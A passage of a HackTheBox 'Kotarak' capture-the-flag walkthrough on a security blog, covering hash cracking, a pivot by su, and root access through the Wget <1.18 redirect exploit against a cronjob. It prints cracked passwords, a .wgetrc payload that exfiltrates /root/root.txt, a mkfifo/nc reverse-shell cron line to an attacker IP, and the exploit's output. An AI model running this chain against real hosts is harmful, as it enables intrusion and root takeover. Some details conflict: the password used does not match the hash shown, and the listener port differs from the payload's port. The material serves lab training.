+<p><img alt="" src="../images/kotarak-cracked-hashes.png"></p>
+<p>In fact, we were able to crack both hashes as shown above.</p>
+<p><code>atanas: 2b576acbe6bcfda7294d6bd18041b8fe --&gt; Password123!</code></p>
+<p><code>Administrator: e64fe0f24ba2489c05e64354d74ebd11 --&gt; f16tomcat!</code></p>
+<p>I tried to <code>su</code> to atanas and was successful by using the password <code>f16tomcat!</code>:</p>
+<div class="highlight"><pre><span></span><span class="err">tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ su - atanas</span>
+<span class="c">Password: </span>
+<span class="err">atanas@kotarak-dmz:~$</span>
+</pre></div>
+
+
+<p>At this point I can easily read the user.txt file as indicated from the permissions below</p>
+<div class="highlight"><pre><span></span><span class="err">atanas@kotarak-dmz:~$ ls -l</span>
+<span class="err">total 4</span>
+<span class="err">-rw-rw---- 1 atanas atanas 33 Jul 19  2017 user.txt</span>
+</pre></div>
+
+
+<p>Now I remember that when I was enumerating with the tomcat user I saw a file called <code>flag.txt</code> which sounded interesting but I didn't have permissions to read it because it was owned by atanas. So I checked that file:</p>
+<div class="highlight"><pre><span></span><span class="err">atanas@kotarak-dmz:/root$ cat flag.txt </span>
+<span class="err">Getting closer! But what you are looking for can&#39;t be found here.</span>
+</pre></div>
+
+
+<p>A bit disappointed! Anyway there is another file in the same location so I have a look as well:</p>
+<div class="highlight"><pre><span></span><span class="err">atanas@kotarak-dmz:/root$ cat app.log  </span>
+<span class="err">10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] &quot;GET /archive.tar.gz HTTP/1.1&quot; 404 503 &quot;-&quot; &quot;Wget/1.16 (linux-gnu)&quot;</span>
+<span class="err">10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] &quot;GET /archive.tar.gz HTTP/1.1&quot; 404 503 &quot;-&quot; &quot;Wget/1.16 (linux-gnu)&quot;</span>
+<span class="err">10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] &quot;GET /archive.tar.gz HTTP/1.1&quot; 404 503 &quot;-&quot; &quot;Wget/1.16 (linux-gnu)&quot;</span>
+</pre></div>
+
+
+<p>From this log file looks like <code>wget 1.16</code> was downloading an archive file every 2 minutes. We are going to assume we have a cronjob running every 2 minutes.</p>
+<p>A quick search with searchsploit reveals an interesting exploit for wget:</p>
+<div class="highlight"><pre><span></span><span class="err">GNU Wget &lt; 1.18 - Arbitrary File Upload / Remote Code Execution                                                                                      | exploits/linux/remote/40064.txt</span>
+</pre></div>
+
+
+<p>I studied a bit the content of the exploit, also available <a href="https://www.exploit-db.com/exploits/40064">here</a>.</p>
+<p>I suggest to read the exploit to understand the mechanism but in short this is what we are going to leverage:</p>
+<p><strong><em>Because of lack of sufficient controls in wget, when user downloads a file with wget, such as: "wget http://attackers-server/safe_file.txt" an attacker who controls the server could make wget create an arbitrary file
+with an arbitrary contents and filename by issuing a crafted HTTP 30X Redirect containing FTP server reference in response to the victim's wget request.</em></strong></p>
+<p>and...</p>
+<p><strong><em>As cron runs priodically attackers, could also write out .wgetrc file in the 
+first response and then write to /etc/cron.d/malicious-cron in the second. 
+If a cronjob is run by root, this would give them an almost instant root code 
+execution.</em></strong></p>
+<p>To cut it short, as the first thing the script will send the output of a file (by default /etc/shadow) back, whereas the second time it will place any piece of code we want in the cronjob that is running.</p>
+<p>I extracted the text of the <strong>wget-exploit.py</strong> and placed it in my kali box. Then I modified the following lines:</p>
+<div class="highlight"><pre><span></span><span class="n">HTTP_LISTEN_IP</span> <span class="o">=</span> <span class="s1">&#39;0.0.0.0&#39;</span>
+<span class="n">HTTP_LISTEN_PORT</span> <span class="o">=</span> <span class="mi">80</span>
+<span class="n">FTP_HOST</span> <span class="o">=</span> <span class="s1">&#39;10.10.14.2&#39;</span>
+<span class="n">FTP_PORT</span> <span class="o">=</span> <span class="mi">21</span>
+
+<span class="n">ROOT_CRON</span> <span class="o">=</span> <span class="ss">&quot;* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 8888 &gt;/tmp/f \n&quot;</span>
+</pre></div>
+
+
+<p>where 10.10.14.2 is the IP of my kali box. I initially used 10.10.10.55 for the HTTP_LISTEN_IP but then I realized kotarak-dmz has multiple interfaces and one of the IPs is on a different networkn thus I added 0.0.0.0 so that any interface can listen.</p>
+<p>In <code>ROOT_CRON</code> I added a command which should give us a reverse shell I dowloaded from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey reverse shell cheatsheet</a>, hence I have used my kali box IP (10.10.14.2) with a random port, 8888 in this case. Once the exploit has been edited as per above I create a simple python http listener on my kali box and I download the script in the victim machine using wget.</p>
+<p>As per the exploit instructions, we need to create a <code>.wgetrc</code> file on our kali box:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# cat &lt;&lt;_EOF_&gt;.wgetrc</span>
+<span class="err">post_file = /root/root.txt</span>
+<span class="err">output_document = /etc/cron.d/wget-root-shell</span>
+<span class="err">_EOF_</span>
+</pre></div>
+
+
+<p>I replaced <code>/etc/shadow</code> with <code>/root/root.txt</code> so that we can get our root.txt back.</p>
+<p>launch the following python command to create an ftp listener in our kali box:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# python -m pyftpdlib -p21 -w</span>
+<span class="err">/usr/local/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:244: RuntimeWarning: write permissions assigned to anonymous user.</span>
+<span class="err">  RuntimeWarning)</span>
+<span class="err">[I 2020-01-29 05:57:40] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=8914 &lt;&lt;&lt;</span>
+<span class="err">[I 2020-01-29 05:57:40] concurrency model: async</span>
+<span class="err">[I 2020-01-29 05:57:40] masquerade (NAT) address: None</span>
+<span class="err">[I 2020-01-29 05:57:40] passive ports: None</span>
+</pre></div>
+
+
+<p>Then we can launch </p>
+<p>After some research I found out that any reserved port (ports below 1024)requires root access to run. As a woraround we can use <strong>Authbind</strong> that is a software that allows a program that would normally require superuser privileges to access privileged network services as a non-privileged user.</p>
+<div class="highlight"><pre><span></span><span class="n">atanas</span><span class="p">@</span><span class="n">kotarak</span><span class="o">-</span><span class="nl">dmz</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">authbind</span> <span class="n">python</span> <span class="n">wget_exploit</span><span class="p">.</span><span class="n">py</span> 
+<span class="n">Ready</span><span class="o">?</span> <span class="n">Is</span> <span class="n">your</span> <span class="n">FTP</span> <span class="n">server</span> <span class="n">running</span><span class="o">?</span>
+<span class="n">FTP</span> <span class="n">found</span> <span class="n">open</span> <span class="n">on</span> <span class="mf">10.10.14.2</span><span class="o">:</span><span class="mf">21.</span> <span class="n">Let</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">go</span> <span class="n">then</span>
+
+<span class="n">Serving</span> <span class="n">wget</span> <span class="n">exploit</span> <span class="n">on</span> <span class="n">port</span> <span class="mf">80.</span><span class="p">..</span>
+
+
+<span class="n">We</span> <span class="n">have</span> <span class="n">a</span> <span class="n">volunteer</span> <span class="n">requesting</span> <span class="o">/</span><span class="n">archive</span><span class="p">.</span><span class="n">tar</span><span class="p">.</span><span class="n">gz</span> <span class="n">by</span> <span class="nl">POST</span> <span class="p">:)</span>
+
+<span class="n">Received</span> <span class="n">POST</span> <span class="n">from</span> <span class="n">wget</span><span class="p">,</span> <span class="n">this</span> <span class="n">should</span> <span class="n">be</span> <span class="n">the</span> <span class="n">extracted</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">shadow</span> <span class="nl">file</span><span class="p">:</span> 
+
+<span class="o">---</span><span class="p">[</span><span class="n">begin</span><span class="p">]</span><span class="o">---</span>
+ <span class="mi">95</span><span class="o">****************************</span><span class="mi">2</span><span class="n">c</span>
+
+<span class="o">---</span><span class="p">[</span><span class="n">eof</span><span class="p">]</span><span class="o">---</span>
+
+
+<span class="n">Sending</span> <span class="n">back</span> <span class="n">a</span> <span class="n">cronjob</span> <span class="n">script</span> <span class="n">as</span> <span class="n">a</span> <span class="n">thank</span><span class="o">-</span><span class="n">you</span> <span class="k">for</span> <span class="n">the</span> <span class="n">file</span><span class="p">...</span>
+<span class="n">It</span> <span class="n">should</span> <span class="n">get</span> <span class="n">saved</span> <span class="k">in</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="n">d</span><span class="o">/</span><span class="n">wget</span><span class="o">-</span><span class="n">root</span><span class="o">-</span><span class="n">shell</span> <span class="n">on</span> <span class="n">the</span> <span class="n">victim</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">host</span> <span class="p">(</span><span class="n">because</span> <span class="n">of</span> <span class="p">.</span><span class="n">wgetrc</span> <span class="n">we</span> <span class="n">injected</span> <span class="k">in</span> <span class="n">the</span> <span class="n">GET</span> <span class="n">first</span> <span class="n">response</span><span class="p">)</span>
+<span class="mf">10.0.3.133</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="n">Jan</span><span class="o">/</span><span class="mi">2020</span> <span class="mo">01</span><span class="o">:</span><span class="mi">44</span><span class="o">:</span><span class="mo">01</span><span class="p">]</span> <span class="s">&quot;POST /archive.tar.gz HTTP/1.1&quot;</span> <span class="mi">200</span> <span class="o">-</span>
+
+<span class="n">File</span> <span class="n">was</span> <span class="n">served</span><span class="p">.</span> <span class="n">Check</span> <span class="n">on</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">hacked</span><span class="o">-</span><span class="n">via</span><span class="o">-</span><span class="n">wget</span> <span class="n">on</span> <span class="n">the</span> <span class="n">victim</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">host</span> <span class="k">in</span> <span class="n">a</span> <span class="n">minute</span><span class="o">!</span> <span class="o">:</span><span class="p">)</span> 
+
+<span class="n">We</span> <span class="n">have</span> <span class="n">a</span> <span class="n">volunteer</span> <span class="n">requesting</span> <span class="o">/</span><span class="n">archive</span><span class="p">.</span><span class="n">tar</span><span class="p">.</span><span class="n">gz</span> <span class="n">by</span> <span class="nl">GET</span> <span class="p">:)</span>
+
+<span class="n">Uploading</span> <span class="p">.</span><span class="n">wgetrc</span> <span class="n">via</span> <span class="n">ftp</span> <span class="n">redirect</span> <span class="n">vuln</span><span class="p">.</span> <span class="n">It</span> <span class="n">should</span> <span class="n">land</span> <span class="k">in</span> <span class="o">/</span><span class="n">root</span> 
+
+<span class="mf">10.0.3.133</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="n">Jan</span><span class="o">/</span><span class="mi">2020</span> <span class="mo">01</span><span class="o">:</span><span class="mi">46</span><span class="o">:</span><span class="mo">01</span><span class="p">]</span> <span class="s">&quot;GET /archive.tar.gz HTTP/1.1&quot;</span> <span class="mi">301</span> <span class="o">-</span>
+<span class="n">Sending</span> <span class="n">redirect</span> <span class="n">to</span> <span class="nl">ftp</span><span class="p">:</span><span class="c1">//anonymous@10.10.14.2:21/.wgetrc </span>
+</pre></div>
+
+
+<p>As we can see from the above output when the script runs it will give us the content of the file we specified in the .wgetrc file, in this care it returns our root.txt (95<strong><em>*</em></strong><strong><em>*</em></strong><strong><em>*</em></strong><strong><em>*</em></strong>2c). Furthermore, after waiting other 2 minutes (next cronjob cycle) we get a reverse shell back since we placed the oneliner code:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvnp</span><span class="w"> </span><span class="mi">9999</span><span class="w"></span>
+<span class="n">listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">[</span><span class="n">any</span><span class="o">]</span><span class="w"> </span><span class="mi">9999</span><span class="w"> </span><span class="p">...</span><span class="w"></span>
+<span class="k">connect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.14.2</span><span class="o">]</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.10.55</span><span class="o">]</span><span class="w"> </span><span class="mi">33476</span><span class="w"></span>
+<span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="nl">sh</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="err">:</span><span class="w"> </span><span class="n">can</span><span class="err">&#39;</span><span class="n">t</span><span class="w"> </span><span class="n">access</span><span class="w"> </span><span class="n">tty</span><span class="p">;</span><span class="w"> </span><span class="n">job</span><span class="w"> </span><span class="n">control</span><span class="w"> </span><span class="n">turned</span><span class="w"> </span><span class="k">off</span><span class="w"></span>
+<span class="err">#</span><span class="w"> </span><span class="n">id</span><span class="w"></span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"></span>
+<span class="err">#</span><span class="w"> </span>
+</pre></div>
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+
+
+
+</body>
+</html>
